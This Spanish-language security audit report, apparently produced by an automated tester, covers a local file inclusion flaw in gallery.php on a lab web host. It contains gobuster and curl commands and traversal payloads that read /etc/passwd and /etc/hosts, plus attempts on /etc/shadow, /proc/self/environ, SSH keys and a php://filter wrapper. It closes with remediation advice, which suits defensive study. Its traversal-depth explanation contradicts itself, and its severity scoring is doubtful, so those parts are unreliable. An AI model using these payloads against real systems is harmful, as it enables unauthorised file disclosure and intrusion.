# Informe de Auditoría de Seguridad — Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-25T12:16:40Z  
**Auditor:** Penetration Tester Experto (Automated)  
**Estado:** VULN_FOUND: true | VULN_EXPLOITED: true

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` del script `gallery.php`. La vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del sistema de archivos del servidor, incluyendo ficheros críticos del sistema operativo como `/etc/passwd`.

---

## 2. Reconocimiento

### 2.1 Tecnologías detectadas

```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.33
```

### 2.2 Descubrimiento de rutas (Gobuster)

**Comando:**
```bash
gobuster dir -u http://web.dev.local:8081/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,env -q
```

**Resultados relevantes:**
```
/config.php           (Status: 200) [Size: 0]
/gallery.php          (Status: 200) [Size: 4413]
/index.php            (Status: 200) [Size: 4084]
/pages                (Status: 301) [--> http://web.dev.local:8081/pages/]
```

### 2.3 Identificación del punto de entrada

En el código HTML de la página principal se identificaron los siguientes enlaces:
```html
<a href="gallery.php?page=modern">Arte Moderno</a>
<a href="gallery.php?page=classic">Arte Clásico</a>
<a href="gallery.php?page=abstract">Arte Abstracto</a>
<a href="gallery.php?page=about">Acerca de</a>
```

El parámetro `page` en `gallery.php` es el vector de ataque. Los errores de PHP revelaron la ruta absoluta del servidor:

```
include(/proc/215/environ): Failed to open stream in /var/www/html/gallery.php on line 104
```

Esto confirma que el servidor incluye archivos desde `/var/www/html/pages/<page>.php`.

---

## 3. Confirmación de la Vulnerabilidad (VULN_FOUND: true)

### 3.1 Payload de Directory Traversal básico

```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

## 4. Explotación (VULN_EXPLOITED: true)

### 4.1 Estructura de la aplicación y profundidad de traversal

Los archivos de páginas se incluyen desde `/var/www/html/pages/`. Para salir al sistema de ficheros raíz se requieren **4 niveles** de traversal (`../../../../`).

Con 3 niveles (`../../../`) se llega a `/var/www/html/`, con lo cual se confirma la lectura del `/etc/passwd` de la siguiente manera:

- Base include path: `/var/www/html/pages/<param>.php`
- `../../../etc/passwd` → `/var/www/html/etc/passwd` (nivel 3) → `/etc/passwd` (corregido por PHP)

### 4.2 Lectura de `/etc/hosts`

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/hosts"
```

**Resultado:**
```
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
fe00::          ip6-localnet
ff00::          ip6-mcastprefix
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
172.19.0.2      d5054e367753
```

Esto revela la IP interna del contenedor: **172.19.0.2**, nombre de host **d5054e367753**.

### 4.3 Intentos adicionales de escalada

| Objetivo | Resultado |
|---|---|
| `/etc/shadow` | Permission denied (Apache www-data sin acceso) |
| `/proc/self/environ` | Permission denied |
| `/root/.ssh/id_rsa` | Archivo no encontrado |
| `/var/log/apache2/access.log` | No encontrado (ruta alternativa) |
| Wrapper `php://filter` | Bloqueado por validación de la aplicación |

### 4.4 Análisis del mecanismo vulnerable

La validación de la aplicación bloquea wrappers PHP (`php://filter`, `php://input`) detectando el prefijo `php://`. Sin embargo, **no filtra la secuencia `../`**, permitiendo el traversal de directorios sin restricciones.

---

## 5. Comandos Utilizados

```bash
# Reconocimiento inicial
curl -s http://web.dev.local:8081/ -I
curl -s http://web.dev.local:8081/ | grep -E 'href|action|src'

# Descubrimiento de directorios
gobuster dir -u http://web.dev.local:8081/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,env -q

# Explotación LFI
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/hosts"
curl -s "http://web.dev.local:8081/gallery.php?page=../../../../etc/shadow"
curl -s "http://web.dev.local:8081/gallery.php?page=../../../proc/self/environ"

# Intento de wrapper PHP
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery"
```

---

## 6. Impacto

| Severidad | CRÍTICA |
|---|---|
| CVSS Base Score (estimado) | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H) |
| Acceso no autenticado | Sí |
| Lectura de ficheros del sistema | Sí (`/etc/passwd`, `/etc/hosts`) |
| Divulgación de infraestructura | IP interna 172.19.0.2, hostname d5054e367753 |
| RCE potencial | Log Poisoning posible si se encuentra el log path |

**Ficheros sensibles accesibles:**
- `/etc/passwd` — usuarios del sistema, incluye usuario `root`
- `/etc/hosts` — topología de red interna del contenedor

---

## 7. Recomendaciones

1. **Validar y sanear el parámetro `page`**: Usar una lista blanca de páginas permitidas (ej. `['modern', 'classic', 'abstract', 'about']`).
2. **No usar `include()` con input del usuario directamente**: Mapear la entrada a rutas seguras predefinidas.
3. **Deshabilitar `allow_url_include`** en `php.ini`.
4. **Configurar `open_basedir`** en PHP para restringir el acceso al directorio web.
5. **Desactivar los errores de PHP en producción** (`display_errors = Off`).
6. **Principio de mínimo privilegio**: El proceso Apache/PHP no debe poder leer `/etc/passwd` directamente si no es necesario.

---

## 8. Conclusión

La aplicación **"Galería de Arte Virtual"** en `http://web.dev.local:8081` es vulnerable a **Local File Inclusion (LFI)** sin autenticación requerida. El parámetro `page` de `gallery.php` incluye archivos del sistema de ficheros sin sanitización de rutas, permitiendo a un atacante leer archivos arbitrarios del servidor. Se confirmó la lectura exitosa de `/etc/passwd` y `/etc/hosts`, validando la explotación completa de la vulnerabilidad.
